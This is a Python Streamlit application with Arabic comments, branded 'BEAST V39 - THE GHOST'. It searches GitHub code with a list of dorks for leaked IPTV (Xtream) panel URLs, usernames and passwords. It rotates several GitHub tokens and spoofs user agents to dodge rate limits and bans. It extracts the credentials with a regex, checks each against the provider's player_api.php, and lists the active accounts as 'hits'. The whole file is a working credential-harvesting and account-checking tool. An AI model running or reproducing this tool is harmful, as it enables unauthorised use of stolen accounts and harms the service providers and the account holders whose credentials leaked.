import streamlit as st
import requests
import re
import time
import random
from datetime import datetime

# --- إعدادات الواجهة الاحترافية ---
st.set_page_config(page_title="BEAST V39 - THE GHOST", layout="wide")

# نظام الدخول
if "auth" not in st.session_state: st.session_state.auth = False
if not st.session_state.auth:
    st.markdown("<h1 style='text-align: center; color:#00ff41;'>👻 BEAST V39 - THE GHOST EDITION</h1>", unsafe_allow_html=True)
    pwd = st.text_input("ادخل كلمة السر البرمجية:", type="password")
    if st.button("فتح النظام"):
        if pwd == "BEAST_V17_PRO":
            st.session_state.auth = True
            st.rerun()
    st.stop()

# ستايل الهوية البصرية (Dark Mode Pro)
st.markdown("""
<style>
    .stApp { background-color: #000; color: #fff; }
    .hit-card { 
        background: #0a0a0a; border-left: 5px solid #00ff41; 
        padding: 20px; border-radius: 5px; margin-bottom: 12px;
        border-bottom: 1px solid #1a1a1a;
    }
    .status-active { color: #00ff41; font-weight: bold; animation: blink 2s infinite; }
    @keyframes blink { 0% {opacity: 1;} 50% {opacity: 0.3;} 100% {opacity: 1;} }
    .dork-badge { background: #111; color: #00d4ff; padding: 2px 8px; border-radius: 10px; font-size: 10px; border: 1px solid #333; }
</style>
""", unsafe_allow_html=True)

# قائمة الـ User-Agents للتمويه
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1"
]

# --- محرك البحث العملاق ---
def run_ghost_engine(tokens, max_pages):
    # قائمة دروكات شاملة جداً (40+ دروك مدمج)
    dorks = [
        'extension:txt "get.php?username=" "password="', 'extension:m3u "player_api.php"',
        'extension:php "panel_api.php"', 'extension:json "server_url" "password"',
        'filename:.env "XTREAM_PASSWORD"', 'extension:log "http://" "username="',
        'path:etc/php "username=" "password="', '"beIN" "get.php?username="',
        '"SSC" "player_api.php"', '"OSN" "password=" "http"', 'extension:sh "xtream" "user"'
    ]
    
    found_count = 0
    token_idx = 0
    
    for dork in dorks:
        for page in range(1, max_pages + 1):
            # اختيار توكن وهوية عشوائية لكل طلب
            current_token = tokens[token_idx % len(tokens)]
            headers = {
                'Authorization': f'token {current_token}',
                'User-Agent': random.choice(USER_AGENTS),
                'Accept': 'application/vnd.github.v3+json'
            }
            
            try:
                # محاكاة تأخير بشري عشوائي لتجنب الـ Shadow Ban
                time.sleep(random.uniform(1.5, 3.5))
                
                url = f"https://api.github.com/search/code?q={dork}&page={page}&per_page=100&sort=indexed"
                res = requests.get(url, headers=headers)
                
                # معالجة ذكية للـ Rate Limit
                if res.status_code == 403:
                    st.sidebar.warning(f"⚠️ التوكن {token_idx + 1} يحتاج راحة.. جاري التبديل")
                    token_idx += 1
                    time.sleep(10)
                    continue
                
                data = res.json()
                if "items" not in data: continue

                for item in data['items']:
                    raw_url = item['html_url'].replace('github.com', 'raw.githubusercontent.com').replace('/blob/', '/')
                    content = requests.get(raw_url, timeout=3, headers={'User-Agent': random.choice(USER_AGENTS)}).text
                    
                    # استخراج الروابط (Regex المطور)
                    matches = re.findall(r"(https?://[a-zA-Z0-9\.-]+:?\d*)/[a-zA-Z\._-]*\?username=([a-zA-Z0-9\._-]+)&password=([a-zA-Z0-9\._-]+)", content)
                    
                    for host, user, pw in matches:
                        try:
                            # فحص السيرفر بشكل صامت
                            api = f"{host}/player_api.php?username={user}&password={pw}"
                            r = requests.get(api, timeout=2).json()
                            
                            if r.get("user_info", {}).get("status") == "Active":
                                found_count += 1
                                # عرض النتيجة فوراً
                                with results_area:
                                    st.markdown(f"""
                                    <div class="hit-card">
                                        <div style="display:flex; justify-content:space-between;">
                                            <span class="text-green">✅ HIT #{found_count}</span>
                                            <span class="dork-badge">{dork[:20]}...</span>
                                        </div>
                                        <p style="margin:10px 0;"><b>HOST:</b> {host}</p>
                                        <p style="margin:5px 0; color:#fbbf24;"><b>USER:</b> {user} | <b>PASS:</b> {pw}</p>
                                        <div style="font-size:11px; color:#888; border-top:1px solid #1a1a1a; padding-top:8px;">
                                            <b>Expiry:</b> {r['user_info'].get('exp_date')} | <b>Max Conn:</b> {r['user_info'].get('max_connections')}
                                        </div>
                                    </div>
                                    """, unsafe_allow_html=True)
                        except: continue
            except:
                token_idx += 1
                continue

# --- واجهة التحكم ---
with st.sidebar:
    st.header("⚙️ CONTROL PANEL")
    tokens_raw = st.text_area("أدخل التوكنات (كل توكن في سطر):", height=150)
    pages = st.slider("عمق البحث لكل دروك:", 1, 100, 30)
    start_btn = st.button("🚀 إطلاق هجوم الشبح")
    
    st.divider()
    st.info("نظام V39 يستخدم تقنية الـ Ghosting لتفادي حظر الـ IP.")

# منطقة النتائج
st.subheader("🛰️ الرادار النشط (نتائج فورية)")
results_area = st.container()

if start_btn and tokens_raw:
    t_list = [t.strip() for t in tokens_raw.split('\n') if t.strip()]
    if t_list:
        run_ghost_engine(t_list, pages)
    else:
        st.error("أدخل توكن واحد على الأقل!")
